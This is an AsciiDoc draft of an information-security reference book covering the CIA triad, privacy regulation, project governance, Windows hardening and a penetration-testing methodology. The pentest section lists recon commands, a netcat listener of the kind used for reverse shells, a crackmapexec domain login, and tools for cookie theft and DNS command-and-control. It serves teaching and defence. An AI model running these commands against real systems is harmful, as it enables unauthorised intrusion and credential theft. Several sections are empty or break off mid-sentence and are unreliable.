= Information Security - A Comprehensive Reference
Doc Writer <ssharif@secunoid.com>
v1.21.08.09.02
:numbered:
:sectnum:
:sectnumlevels: 5
:chapter-label:
:toc: right
:toclevels: 5
:docinfo:
:docinfo1:
:docinfo2:
:description: This document covers all aspects of information security
:keywords: information security, cyber security, it security, data security, compliance, risk management, project management
:imagesdir: images
:stylesheet:
:homepage: https://www.secunoid.com
'''


<<<
== Overview
Everything in this world is centered around information, knowledge, which translates into a generic term _data_.  This data can be about individuals, places, or things.  Regardless of who or what it is about it is important to protect it.

There exists approximately 4,294,967,296 (four billion two hundred ninety-four million nine hundred sixty-seven thousand to hundred ninety-six) IPv4 Addresses.  This pool is 32-bits in size.  Scanning these addresses is an embarrassingly parallel workload and ca be easily distributed over any number of systems.  The term embarrassingly parallel simply means that little or no effort is needed to seperate this problem into a number of parallel tasks.  Password cracking and 3d video rendering are also examples o this type of problem.

=== Non-living Entities
Data about non living entities when modified leads to mis-information and currently in the digital age our ability to provide the authenticity of that data is very difficult.  If the source is trustworthy, then we deem it authentic, currently there are no mechanisms to ensure that the data has not been modified in between from when the trustworthy source released and to the time it got to you.

=== Living Entities
Data about living entities, especially us humans is very valuable.  With the devices we carry, and use in our daily lives, we are constantly producing data, every hour, every second of our lives. 

<<<
== What is information security?
The foundation of information security is based on three pillars also known as the *triad*

. Confidentiality
. Integrity
. Availability

== Why are they important?
What is the the topic of discussion, *Information Security* , there two key words here *information* and *security*, viz a viz securing information.

You have to condition yourself to always think about what protecting,  the *information*.  Once you get this concept the rest is easy.

Then think of how does this information move in the environment.  Information of any type goes through follwoing lifecycle stages, also knows as CRUD:

. Create
. Read
. Update
. Delete


The sections below will build upon them.

=== Confidentiality
NIST defines "Confidentiality" as Preserving authorized restrictions on information access and disclosure, including means for protecting personal privacy and proprietary information.

=== Integrity
NIST defines "Integrity" as Guarding against improper information modification or destruction, and includes ensuring information non-repudiation and authenticity.

=== Availability
NIST devines "Availability" as Ensuring timely and reliable access to and use of information.


<<<
== Privacy
Centralization has very damaging impacts to a users privacy.  Once the user has provided their information to an entity, they are at entities' mercy for data protection.

Certain states want to keep 

Data that is being processed by the solution should care fully considered for:

. Data protection: Based on data classification ensure data is protected in storage and in transit.
. Data retention: Based on regulatory, and industry requirements,  data should be retained for 
. Data access & update: Allow end users ability to access their data and modify it as required.

Governments across the world are responding to the global cyber security crisis by creating new regulations that govern the way companies handle and store valuable consumer data. This includes important information such as personal identifications, banking and credit card numbers, and purchase history.

The European Union, in particular, has been a leader in this field. One of its pioneering efforts is the General Data Protection Regulations (GDPR) what was passed in 2016 and went into effect in Spring 2018. It impacts all companies that do business with European customers, regardless of where the company is located.

The GDPR requires that companies receive consent from consumers before processing data, collect and store data anonymously, and notify customers when their information has potentially been breached. It also requires large businesses to appoint a data privacy protection officer to oversee implementation of the regulations.

Furthermore, while the U.S. federal government has yet to create a set of strong data privacy protections, several states have drawn up their legislation, including Hawaii, Massachusetts, Maryland, Mississippi, New Mexico, and Washington.

However, the most important of these regulations come from California, the largest state in the country by population with nearly 40 million residents. The California Consumer Privacy Act (CCPA) goes into effect on January 1, 2020, and governs the way companies must store and secure data.

CCPA allows consumers to demand crucial information about their personal data held by corporations.

When requested, businesses must inform consumers about the type of personal data they possess, provide them with specific personal information collected in the previous year, and allow customers to request that their information not be shared with third parties. Companies will also have to delete customer data when requested.



<<<
== Data Protection

=== Methodology
. Define what to classify
. Define where to classify
. Define who applies classification
. Define conditions
. Assign labels to users and groups
. Define Access rights
. Create classification policies
. Test Classification policies
. Deploy classification policies
. Monitor and accelerate remediation

=== Know your data
. Where is my sensitive data 
located? 
. What are the risky activities happening in my organization – files shared externally, across 1st and 3rd party apps?
. I need to comply with a new regulation? Where is my PII data located & where is it being generated? 
. How do I control data sprawl and build a strategy for ROT before I bring data
. How do I see activity around classification and labeling across retention and sensitivity labels once they have been used across governance and retention outcomes?
. How do I monitor  ongoing risk around label activity?


=== Password Strength
Brute force password cracking - the importance of using a long password with a mix of uppercase, lowercase and special characters.

Assuming an attacker has a reasonably fast connection and PC, the table is an estimate of the amount of time it would take to generate every possible combination of passwords for a given number of characters. After generating the list it's just a matter of time before the computer runs through all the possibilities – or gets shut down trying.

Pay particular attention to the difference between using only lowercase characters and using all possible characters (uppercase, lowercase, and special characters – like @#$%^&*). Adding just one capital letter and one asterisk would change the processing time for an 8 character password from 2.4 days to 2.1 centuries.

via Dan Williams (https://www.linkedin.com/in/ACoAAACDV6ABaDOtrduFQ5p-c5qgSka1HHTseAY/?lipi=urn%3Ali%3Apage%3Ad_flagship3_feed%3BxdsE5HnqTDulyw2QOn9mCw%3D%3D)

image::PasswordLengthComplexityCrackingTime.jpg[]

<<<
== Information Security 
Information Security as you can infer, all about information protection.  Before the advent of internet information was stored in corporate data centers and they had mechanisms in place to protect the information.  The two main areas that are focused are logical and technical security.

=== Logical Security
Logical controls are about physical aspects of the information protection.  The computer system is housed in a building in a particular area.  Depending on the sensitivity of the information various mechanisms are put in place like:

* Fenced building perimeter
* Gates at the entry and exit points
* Guards manning those gates to ensure that only authorized individuals are allowed through the gates

Now working through the layers just like peeling an onion. You have gone through the first layer the perimeter. Now once in the perimeter it has to be ensured:

* Ensuring protections are in place to prevent vehicles damaging the building via direct impacts
* Split the building into zones with different levels of access levels for the personnel and this can be gated & guarded area
* Ensure computer room is in the middle of the building without any window access
* The computer room can be split into zones depending on the sensitivity of the information
* Access to these zones can be gated and guarded
* Assets within these zone would be placed in cabinets that are again secured via lock and key

=== Technical Security
Now that we have addressed the physical security aspects Once inside the computer room, this is where information security starts to take shape.  All the computers in the computer room will need to be accessed by the users.  People with different levels of access would be physically separated into specific areas.  For instance Super users were in a different physical space than regular users.

With the advent of networking,TCP/IP, and better access control mechanisms in operating systems that requirement to physically segregate users started to diminish.

That requirement to physically segregate users with different levels of access via gates and guards moved to the network and operating system level and this is where information security started to take a foot hold.

Applications that operated on top of the operating system implemented fine grained access mechanisms for the users.

The gates and guards started getting replaced by electronic locks with pin pads and cameras.  Whereby to prove that you were authorized to access an area, you would have the PIN to the door which you would use to get access.  

The PIN pads later got replaced by card access, where you had to scan your card to enter an area.

As you can see a lot of Physical Security controls are also moving into information security space whereby the cameras that are recording and the recording management software, the card access system and access management are all managed by applications that are operating on top of an operating system running on a computer system.

Enter Information Security, which at the most fundamental level is the basis for:

* Information Technology Security
* System Security
**  Network Security
**  Application Security
*** Database Security
* Cyber Security

This book will cover the various aspects of implementing an Information Security Program at an organization of any size. You don't have to be a huge organization to have an information security program.  If you are in business you are collecting, storing, and transmitting all kinds of information and it important that you know how to ensure that information is protected at all times.  If it is not then maybe your business might be at risk.

<<<
== Organizational Structure
You can have the best security organization, however, if you do not have security embedded in Project Delivery, Vendor Management, Change Management, and Operations then it becomes to enforce security.


<<<	
=== Security Organization
For Security to be taken seriously a security organization is mandatory, while the non operational team would report to the CISO, the operational structure can be based on two models:

* Centralized
* Distributed

In centralized operational model, all aspects of security operations are within the security organization, such as:

* User provisioning/de-provisioning
* Security Information & Event Management (SIEM)
* Security Operations Center
* Incident Response
* Firewall & Network Operations

In a decentralized operations model, the above aspects are managed by different business units with the security organization providing oversight in form of GRC.

==== Security Operations
A robust mechanism must be instituted to ensure all systems are baselined and any deviation from the baseline is reported to the SOC  for action.
All critical components must be monitored at all times, and SIEM   leveraged to discover anomalies and ensure they are addressed in a timely fashion.

==== Security Architecture

==== Security Development

==== Security Strategy

<<<
=== Project Management Office (PMO)
PMO sets standards for how projects are managed and to monitor their progress.

* Define standards and rules for project management
* Monitor and approve projects
* Improve the success rate of projects
* Provide training around project management methodologies and standards
* Create relevant documentation and templates

Reasons for having a PMO:

* Ensure compliance with business strategy. The reason why companies run projects is because they need to innovate. They must constantly create new products or services so they won’t end up as the next Kodak. Once you understand this, you understand why having projects succeed is so important. A PMO can act as a watchdog for ensuring projects actually deliver business value.
* Improve overall project success rate. If many of the projects in your company fail, exceed their budget or get delayed, then that’s a good reason for having a PMO.
* Set common standards. If every department has their own set of templates and follows their own project methodology, this can make it hard for cross-functional projects to succeed. A PMO can define common standards that departments have to follow.
* Security, Compliance, and Industry requirements are considered.

There are key roles every project needs, and PMO has to ensure that those roles exist in the organization.

==== Organizational Structure
Following organizational structures have been put togther for illustrative purposes, and can be modified as long as the segegration of duty and deliverables are maintained.

===== Centralized

image::PMOStructure-Centralized.png[]

===== De-Centralized

image::PMOStructure-DeCentralized.png[]

==== Key Organizational Roles
This section identifies roles that are key for successful project delivery and organizational compliance.

===== Product Owner 

* Sits in the business hierarchy
* Translates business requirements into how the product will operate within the organization
* Product creation, operationalization, and ongoing evolutionevolution
* Maintains the product lifecycle
* Understands roles of everty department in the organization as it pertains to operating and maintaining the product
* Ultimate decision maker on behalf of the business

===== Business Analyst

“Business analysis is the practice of enabling change in an enterprise by defining needs and recommending solutions that deliver value to stakeholders”

* Consult with management, staff and customers on how work is done in an organization
* Design solutions to improve organizational efficiency and productivity
* Write functional requiremnets using models and diagrams
* Communicate with internal colleagues to understand the needs of departments and the ogranization as a whole
* Work with external stakeholders to understand and investigate feedback into the service/function/product provided
* Use data modeling practises to analyse findings and create suggestions for strategic and operational improvements and changes
* Product end to end process maps to for the entire lifecycle of the product
* Good understanding of flowcharting specifically Business Process Model & Notation (BPMN)

===== Systems Analyst

* Ability to understand translate BPMN diagrams to system level flow diagrams
* Ability to create Unified Modeling Language (UML) diagrams
* Identify, understand and plan for organizational and human impacts of planned systems, and ensure that new technical requirements are properly integrated with existing processes and skill sets.
* Plan a system flow from the ground up.
* Interact with internal users and customers to learn and document requirements that are then used to produce business required documents.
* Write technical requirements from a critical phase.
* Interact with software architects to understand software limitations.
* Help programmers during system development, e.g. provide use cases, flowcharts, UML and BPMN diagrams.
* Document requirements or contribute to user manuals.
* Whenever a development process is conducted, the system analyst is responsible for designing components and providing that information to the developer.
* Identify Impacted Systems and required configuration changes

===== Security Architect

* Ensure Information Security Policy is being adered to
* Privacy Impact Assessment (PIA) is completed
* Data Classification is completed 
* Information protection mechanisms are considered in the design
* Security Monitoring 
* Incident Response
* Data Retention
* Security Testing

===== Infrastructure Architect

* Identify Network, Server, Storage, & Monitoring Requirements
* Create Network, Server, Storage, & Monitoring Designs
* Create Network, Server, Storage, & Monitoring Implementation Plans
* Capacity Planning
* Infrastructure Resiliency Planning, Designing, and Implementation

==== Tools
Following tools & technology are may be required to establish a successful project delivey pipeline

* Project Management
* Requirements mangement & tracabillity tools such as: 
** Azure Dev Ops
** JIRA
* Business Process Model & Notification (BPMN) Tools, such as:
** Camunda
* Unified Modeling Language (UML) tools such as: 
** Rational Rose Tools 

==== Project Delivery Process & Governance
This section outlines the process, key deliverables at each phase of the project delivery.

===== Gate 0 --> Gate 3

image::Project Lifecycle Gate 0-3.png[]

===== Gate 4

image::Project Lifecycle-Gate 4.png[]

===== Gate 5 --> Gate 6

image::Project Lifecycle-Gate 5 - 6.png[]

==== Project Deliverables Matrix

[format="csv",cols="3,^2,^2,^2,^2,^2",options="header"]
|===================================================
Deliverable,Project Manager,Business Analyst,System Analyst,Security Architect,Infrastructure Architect 
include::includes/DeliverablesMatrix.csv[]
|===================================================
image::DeliverablesMatrix.png[]

==== Governance
To ensure the project meets is deliverables, timelines, and budget, it has to have checkpoints at different intervals to ensure all the stakeholders are on the same page.  The sub-sections below will outline "suggested" checkpoints for you to consider. 

===== Meeting Minutes
It goes without saying how important minutes for each of these meetings are to ensure all the decisions were documented and action items logged and assigned to named individuals.

===== Gates
"Gates" are checkpoints where two distinct teams should be reviewing the projects.  

====== Technical Review
A technical review board should be established that conducts the review of the solution from Gates 1 through 4.  This review ensures projects' adherence strategic plan and blueprints for: 

* Business Requirements
* Enterprise Architecture
** Business Architecture
** Application Architecture
** Data Architecture
** Technology/Infrastructure Architecture
* Security Architecture
* Compliance  
 
====== Financial Review
Financial Reivew is ususally conducted by the Finance to who is providing funding to the project.  Funding is released at specific deliverable milestones.  Most organizations align these reviews to the Technical Reviews whereby after the technical reivew is compelte, i.e. the criteria for that specific gate has been met then the project is cleared to request funding for the next Gate of the project.  The Finance team can review following criteria:

* Estimates vs Actuals
* Capital Burn Rate
* Depending on the project performance and timelines decide how much to fund this initiative

===== Steering Committee Meetings
Also called Steerco meetings are held with project sponsors and key stakeholders at senior level where identified project risks are discussed and their treatment discussed.

===== Internal Team Meetings
These meetings are held with technical and business stakeholders in the organizatino, who are responsible for delivering work packages.  These meetings are usually held weekly to ensure project deliverables, timelines, and budget are tracked and project risks identified.  These risks are then shared with the steerco for further decisioning.

===== Weekly Internal/External Team Meetings
These meetings are held with external entities who are part of the project delivery, select techincal and business lead should attend this meeting to land on overall solution deliverables.  Depending on the complexity of the project, they can be held weekly or as required by the internal project teams.


==== Implementation Plan
The organizational structure and methodology that has been proposed above is the "Lean" way to get "started", what I may call quick and dirty.

. Keep it simple, do not overwhelm the business with too much information, advise them of the end goal and provide assurances that you will manage the complexity of this implementation.  
. The whole implementation could take years, however implement changes in phases to ensure organization is not overwhelmed by the changes.
. In absence of the establishment of the required org structure, document a plan on how to start using the new methodology
. Start creating Templates for: 
.. Project Charter
.. Project Change Requests
.. Meeting Minutes
.. Issues and Actions register
.. Financial Reporting
.. Financial Expenses Tracking
.. Implementation Plans/MOP's
. Create Job Aids and Samples
. Create Checklists
. Governance Processes

<<<
== Security Policy
Before any solution is implemented, a security policy must be created to ensure all the industry, regulatory,  and other compliance requirements are documented.  This document will provide the security requirements to ensure the deployment is secure. All the requirements should be very high level without delving into implementation details.

<<<
== Security Manual
This document goes into details on the how the security policy requirements must be implemented.  It can be one document, or multiple depending on the size of implementation.

<<<
== Security Standards
Standards are mandatory requirements that must be adhered to. Some of the standards to be considered are:

=== Windows Web Server Hardening

*Services*

* Unnecessary Windows services are disabled.
* Services are running with least-privileged accounts.
* FTP, SMTP, and NNTP services are disabled if they are not required.
* Telnet service is disabled.

*Protocols*

* WebDAV is disabled if not used by the application OR it is secured if it is required.
* TCP/IP stack is hardened
* NetBIOS and SMB are disabled (closes ports 137, 138, 139, and 445).

*Accounts*

* Unused accounts are removed from the server.
* Guest account is disabled.
* IUSR_MACHINE account is disabled if it is not used by the application.
* If your applications require anonymous access, a custom least-privileged anonymous account is created.
* The anonymous account does not have write access to Web content directories and cannot execute command-line tools.
Strong account and password policies are enforced for the server.
* Remote logons are restricted. (The “Access this computer from the network” user-right is removed from the Everyone group.)
* Accounts are not shared among administrators.
* Null sessions (anonymous logons) are disabled.
* Approval is required for account delegation.
* Users and administrators do not share accounts.
* No more than two accounts exist in the Administrators group.
* Administrators are required to log on locally OR the remote administration solution is secure.

*Files and Directories*

* Files and directories are contained on NTFS volumes
Web site content is located on a non-system NTFS volume.
* Log files are located on a non-system NTFS volume and not on the same volume where the Web site content resides.
* The Everyone group is restricted (no access to \WINNT\system32 or Web directories).
* Web site root directory has denied write ACE for anonymous Internet accounts.
* Content directories have deny write ACE for anonymous Internet accounts.
* Remote  administration application is removed
* Resource kit tools, utilities, and SDKs are removed.
* Sample applications are removed

*Shares*

* All unnecessary shares are removed (including default administration shares).
* Access to required shares is restricted (the Everyone group does not have access).
* Administrative shares (C$ and Admin$) are removed if they are not required (Microsoft Management Server (SMS) and Microsoft Operations Manager (MOM) require these shares).

*Ports*

* Internet-facing interfaces are restricted to port 80 (and 443 if SSL is used)
* Intranet traffic is encrypted (for example, with SSL) or restricted if you do not have a secure data center infrastructure.

*Registry*

* Remote registry access is restricted.
* SAM is secured (HKLM\System\CurrentControlSet\Control\LSA\NoLMHash).

*Auditing and Logging*

* Failed logon attempts are audited.
* IIS log files are relocated and secured.
* Log files are configured with an appropriate size depending on the application security requirement.
* Log files are regularly archived and analyzed.
* Access to the Metabase.bin file is audited.
* IIS is configured for W3C Extended log file format auditing.

*Server Certificates*

* Ensure certificate date ranges are valid.
* Only use certificates for their intended purpose (For example, the server certificate is not used for e-mail).
* Ensure the certificate’s public key is valid, all the way to a trusted root authority.
* Confirm that the certificate has not been revoked.

<<<
== Security Guidelines

<<<
== Cryptography

Cryptographic Blinding

<<<
== Digital Identity

Digital Identity is a bridge that connects the physical and the digital world.  You can call them Personna's in a digital world.

Cost of financial intermediation is been going up due to regulation.

According to Europol we are spending about $20b to intercept 0.15% of the fraudulent flows of money.

<<<
== Training & Education

=== Phishing

==== GoPhish
An opensource toolkit to generate phishing campaigns for organizations to test their employee phishing knowledge
Link: https://github.com/gophish/gophish/releases/


<<<
== Application Security
The scope of application security would be the 


=== Code Analysis

==== Microsoft Application Inspector
Microsoft Application Inspector is a software source code analysis tool that helps identify and surface well-known features and other interesting characteristics of source code to aid in determining what the software is or what it does. It has received attention on ZDNet, SecurityWeek, CSOOnline, Linux.com/news, HelpNetSecurity, Twitter and more and was first featured on Microsoft.com.

Application Inspector is different from traditional static analysis tools in that it doesn't attempt to identify "good" or "bad" patterns; it simply reports what it finds against a set of over 400 rule patterns for feature detection including features that impact security such as the use of cryptography and more. This can be extremely helpful in reducing the time needed to determine what Open Source or other components do by examining the source directly rather than trusting to limited documentation or recommendations.

The tool supports scanning various programming languages including C, C++, C#, Java, JavaScript, HTML, Python, Objective-C, Go, Ruby, PowerShell and more and can scan projects with mixed langauge files. It also includes HTML, JSON and text output formats
Link: https://github.com/microsoft/ApplicationInspector

==== PEpper
An open source tool to perform malware static analysis on Portable Executable
Link: https://github.com/Th3Hurrican3/PEpper


=== Key Management

<<<
== System Security
All the servers that the distributed ledger platform runs on must be:

. Hardened
. Monitored for availability
. Intrusion Detection/Intrusion Protection mechanisms deployed to protect from attacks coupled with SIEM for proactive defense.
. Based on the security be in a DMZ 

<<<
== Vulnerability Management Program
Red team-blue team exercises take their name from their military antecedents. The idea is simple: One group of security pros — a red team — attacks something, and an opposing group — the blue team — defends it. Originally, the exercises were used by the military to test force-readiness.

=== Deep vs Dark Web
Dark web is every resource where hackers & criminal underground engage with each other.  Tor is a mechanism that is used as a transport for the dark web.

image::DeepWebDarkWeb.jpeg[]

Source: https://heimdalsecurity.com/blog/deep-web-vs-dark-web-what-is-each/ 


=== Pastebin

=== Taxonomy
Taxonomy is important as it ensures industry standard terms are used when talking about vulnerabilities, threat actors, and reporting.

==== Attacks

image::TypesOfAttacks.jpg[]

===== Social Engineering Attacks
* *Phishing* The perpatrator send an email or text to the target, seeking valuable information

* *Vishing* The perpatrator makes a fradulent phone calls to the target, seeking valuable information

* *Baiting* Baiting attacks use a false promise to pique a victims's curiosity.  They lure users into a trap that steals their personal information.

* *Quid pro quo* The perpatratpr makes random calls to a company's employees offering a service or a benefit in exchange for information or access

* *Pretexting* It is often initiated by a perpatrator pretending to need sensitive information from a victim so as to perform a critical task.  The success rate of this attack heavily depends on the attackers ability to build trust.

* *Watering Hole* The perpetrator injects malicious code into the web pages that the targets visit.  Once a victim visits the page on the compromised website, a backdoor Trojan is installed on thier computer.

==== Malware
A malware is any piece of software that was written with the intent of damaging devices, stealing data, and generally causing a mess. Viruses, Trojans, spyware, and ransomware are among the different kinds of malware.

Malware is often created by teams of hackers: usually, they’re just looking to make money, either by spreading the malware themselves or selling it to the highest bidder on the Dark Web. However, there can be other reasons for creating malware too — it can be used as a tool for protest, a way to test security, or even as weapons of war between governments.

image::TypesOfMalware.jpg[]

* *Adware* Though not always malicious in nature, aggressive advertising software can undermine your security just to serve you ads — which can give other malware an easy way in. Plus, let’s face it: pop-ups are really annoying.

* *Bots* Bots is a soft for roBot. Bots are usually controlled remotely and work as a network.

* *Keylogger* It is one of the most dangerous threats to a PC user's privacy. This type of malware installs itself as a result of clicking while browsing the Internet or downloading software. Keyloggers keep track of all of your keystrokes when you are using your PC and then transfers the information to a remote server. It is capable of recording all of your online conversations, emails, and password logins, as well as creating screenshots of all of your PC activity.

Keyloggers are not always in the form of malware or software; it can also be installed on your computer in the form of hardware through being placed between the plug on your keyboard and the entry port. Some keyloggers are legitimate applications such as those that record an employee's PC activity during work hours. Other keyloggers are in the form of malicious software that is designed to perform criminal activity.

* *Ransomware* This kind of malware typically locks down your computer and your files, and threatens to erase everything unless you pay a ransom.

* *Remote Access*

* *Rootkit*

* *Spyware* No surprise here — spyware is malware designed to spy on you. It hides in the background and takes notes on what you do online, including your passwords, credit card numbers, surfing habits, and more.

* *Trojans* This kind of malware disguises itself as legitimate software, or is hidden in legitimate software that has been tampered with. It tends to act discreetly and create backdoors in your security to let other malware in.

* *Virus* Like their biological namesakes, viruses attach themselves to clean files and infect other clean files. They can spread uncontrollably, damaging a system’s core functionality and deleting or corrupting files. They usually appear as an executable file (.exe)

* *Worm* Worms infect entire networks of devices, either local or across the internet, by using network interfaces. It uses each consecutively infected machine to infect others.

=== Vulnerability Assessment
Vulnerability Assessment is designed to find vulnerabilities and assess to ensure they are not false positives. The next step is to remediate the vulnerability by patching the system, reconfiguring it, or implementing other controls to reduce the risk. 

=== Penetration Testing
Penetration testing, or pen testing for short, is an authorized attack against your computer system to discover and exploit vulnerabilities.  This activity is also known as ethical hacking.  

Penetration testing is a technical control that is implemented to ensure the systems that are currently in production or are going to be production do not have any vulnerabilities that would allow threat vectors to exploit.

The Penetration Testing Execution Standard (PTES) provides the necessary guidelines on how to conduct penetration testing.  More information can be found here: http://www.pentest-standard.org/index.php/Main_Page 

Penetration Testing goes further than vulnerability assessment.  After a vulnerability is identified, the tester attempts to exploit a vulnerability. This can be done numerous ways and, once a vulnerability is exploited, a good tester will not stop. They will continue to find and exploit other vulnerabilities, chaining attacks together, to reach their goal. Each organization is different, so this goal may change, but usually includes access to Personally Identifiable Information (PII), Protected Health Information (PHI), and trade secrets. Sometimes this requires Domain Administrator access; often it does not or Domain Administrator is not enough.

Penetration testing involves following steps:
. Reconnaissance via open source intelligence (OSINT) gathering techniques.  IT does not involve probing any or your devices, but gathering as much information publicly available about your environment using internet sources. 
. Scanning your network to identify active devices
. Fingerprint active devices to identify operating system and applications installed
. Find vulnerabilities for the services running on your systems
. Exploiting those vulnerabilities
. Once the vulnerability has been exploited, further probing the system to seek valuable information such as PII (Personally Identifiable Information) etc.
. Try to further explore other systems on the network and exploit them if possible.
. Produce a report that identifies vulnerabilities, which ones were exploited, what was the outcome of exploitation and suggest high level remediation steps.

There are three approaches to Penetration Tests:
. Black Box: No knowledge of th infrastructure.
. White Box: Full knowledge of the infrastructure.
. Grey Box: Some knowledge of the infrastructure.

Penetration Tests can include following scopes:
. External
. Internal
. Web application
. Wireless
. Cloud
. Social

==== Penetration Testing Methodology

===== Reconnaissance
. Open Source Intelligence Gathering
.. Look for sub-domains:

	sublist3r -d <domainname> -t3 -o <filename.txt>

.. Look for sub-domains, users, etc:

	theharvester -d <domainname> -b all -f <outputfilename>

. Discovery Scan

	nmap -sC -sV -oA foldername/filename IPAddress
	nmap -sC -sV -oA foldername/filename -iL <inputfilename>

. Recon scan all ports
	
	nmap -p- -v -oA foldername/filename-allports IPAddress

. If webservers are found perform web server enumeration:

	dirb -d <domainname> 
	gobuster 

. Take notes of all the findings and also include screen captures.
. 

==== Penetration Testing Tools
Following are some of the Pentesting tools organized by a particular stage in my pentesting methodology.

===== Documentation
==== CherryTree
Chery Tree is a note taking app

===== Open Source Intelligence (OSINT)

====== Search Engines

image::SearchEnginesForSecurityProfessionals.jpg[Best Search Engines for Security Professionals and Pen Testers] 

====== Katana
https://github.com/adnane-X-tebbaa/Katana[Katana-ds] (ds for dork_scanner) is a simple python tool that automates Google Hacking/Dorking and support Tor
It becomes a more powerfull in combination with https://www.exploit-db.com/google-hacking-database[GHDB]

====== Metabigor
Metabigor is Intelligence tool, its goal is to do OSINT tasks and more but without any API key.

Link: https://www.kitploit.com/2020/02/metabigor-intelligence-tool-but-without.html

====== Maltego

====== Maryam
OWASP Maryam is an Open-source intelligence(OSINT) and Web-based Footprinting modular framework BASED on The Recon-ng and written in Python.
Link: https://www.owasp.org/index.php/OWASP_Maryam_Project 

====== OSI.IG
https://github.com/th3unkn0n/osi.ig [Instagram OSINT Tool] gets a range of information from an Instagram account that you normally wouldn't be able to get from just looking at their profile

The information includes:

* [ profile ] : user id, followers / following, number of uploads, profile img URL, business enum, external URL, joined Recently, etc
* [ tags & mentions ] : most used hashtags and mentioned accounts
* [ email ] : if any email is used any where it'll be displayed
* [ posts ] : accessability caption, location, timestamp, caption, picture url, etc

====== Recon_Spider
https://github.com/Aravindha1234u/Recon_Spider[Recon_Spider] scrapes social media account details from Instagram, Facebook and Twitter. It can find details about Phone number, Email data Breach.
Domain module has various scans for domain check for vulnerability and spider crawlers
Metadata Analyser
Reverse Image Search
IP Heatmap generator
Mac Address finder of manufacturer
IP2Proxy checks whether provided ip uses any kind of Proxy/VPN if any then check for DNSLeaks
Torrent Download History
Tool is currently available only in Command Line Interface (CLI)

Its public to use with your own api keys

====== Shodan
. Shodan is a search engine for devices connected to internet

===== Footprinting

====== Bloodhound
https://github.com/BloodHoundAD/Bloodhound/wiki[BloodHound] is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a PowerShell/C# ingestor.

BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attacks can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.

BloodHound is developed by @_wald0, @CptJesus, and @harmj0y.


====== Masscan
https://github.com/robertdavidgraham/masscan[MASSCAN] is an Internet-scale port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10 million packets per second, from a single machine.

It's input/output is similar to nmap, the most famous port scanner. When in doubt, try one of those features.

Internally, it uses asynchronous transmissions, similar to port scanners like scanrand, unicornscan, and ZMap. It's more flexible, allowing arbitrary port and address ranges.

NOTE: masscan uses a its own custom TCP/IP stack. Anything other than simple port scans may cause conflict with the local TCP/IP stack. This means you need to either the --src-ip option to run from a different IP address, or use --src-port to configure which source ports masscan uses, then also configure the internal firewall (like pf or iptables) to firewall those ports from the rest of the operating system.

====== NESSUS

http://www.hackandtinker.net/2013/10/16/how-to-install-setup-and-use-nessus-on-kali/[Install Instructions]

====== NMAP

====== DIRB

DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the response.

DIRB comes with a set of pre-configured attack wordlists for easy usage but you can use your custom wordlists. Also DIRB sometimes can be used as a classic CGI scanner, but remember is a content scanner not a vulnerability scanner.

DIRB main purpose is to help in professional web application auditing. Specially in security related testing. It covers some holes not covered by classic web vulnerability scanners. DIRB looks for specific web objects that other generic CGI scanners can’t look for. It doesn’t search vulnerabilities nor does it look for web contents that can be vulnerable.

Source: http://dirb.sourceforge.net/about.html
DIRB Homepage | Kali DIRB Repo

Author: The Dark Raver
License: GPLv2

https://tools.kali.org/web-applications/dirb 

====== Dirbuster

===== Reconnaissance
Combining the information gathered from OSINT and Footprinting activities.  This leads to finding vulnerabilities, exploiting them, lateral movement, persistence.

====== Admin-scanner
https://github.com/alienwhatever/Admin-Scanner[Admin-Scanner] - This Tool Is Design To Find Admin Panel Of Any Website By Using Custom Wordlist Or Default Wordlist Easily

===== Payload Delivery



====== Cryptcat
https://tools.kali.org/maintaining-access/cryptcat[CryptCat] is a simple Unix utility which reads and writes data across network connections, using TCP or UDP protocol while encrypting the data being transmitted. It is designed to be a reliable “back-end” tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities.

===== Netcat

nc -lvnp 9001

===== Exploitation

====== Arpspoof

====== Burp Suite
Burp Suite is a web application testing tool

Use vulnerable web application from the OWASP site: https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project/Pages/Offline  

====== Cookie Crimes

If you steal someone’s Chrome cookies, you can log in to their accounts on every website they’re logged in to.

Normally you need the user’s password to do it, but I found a way to do it without the password. You just need to be able to execute code on their computer. It works by using Chrome’s Remote Debugging Protocol.

Link: https://github.com/defaultnamehere/cookie_crimes

===== Post-Exploitation

====== Crackmapexec
CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of "Living off the Land": abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.

Link: https://github.com/byt3bl33d3r/CrackMapExec

Usage:
	crackmapexec smb <IP Of Domain Controller> -u <username> -p '<password>'

====== PoshC2
https://www.hackingarticles.in/command-control-poshc2/[PoshC2] is an open-source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in PowerShell. Although PoshC2 primarily focuses on Windows implantation, it does contain a basic Python dropper for Linux/macOS.


===== Lateral Movement

===== Persistence

===== Chisel





===== DNSCAT
DNScat is such praised tool because it can create a command and control tunnel over the DNS protocol which lets an attacker work in stealth mode. You can access any data along with uploading and downloading files and to get a shell. For this tool to work over 53 port, you don’t need to have authoritative access to DNS server, you can just simply establish your connection over port 53 and it will be faster and it will still be sensed as usual traffic. But it makes its presence well known in the packet log.

DNScat is made of two components i.e. a server and a client. To know the working of dnscat, it is important to understand both of these components.

The client is intended to be kept running on a target machine. It’s written in C and has the least amount of the prerequisites. When you run the client, you regularly indicate a domain name. All packets will be sent to the local DNS server, which is then directed to the legitimate DNS server for that domain (which you, apparently, have control of).

The server is intended to be kept running on a definitive DNS server. It’s developed in ruby and relies upon a few distinct gems. When you run it, much like the client, you indicate from which domain(s) it listens to over 53. When it gets traffic for one of those domains, it endeavours to set up a legitimate association. It gets other traffic it will automatically disregard it but, however, it can also advance it upstream.
Link: https://www.hackingarticles.in/dnscat2-command-and-control-over-the-dns/?

===== DNSSPOOF

===== Empire
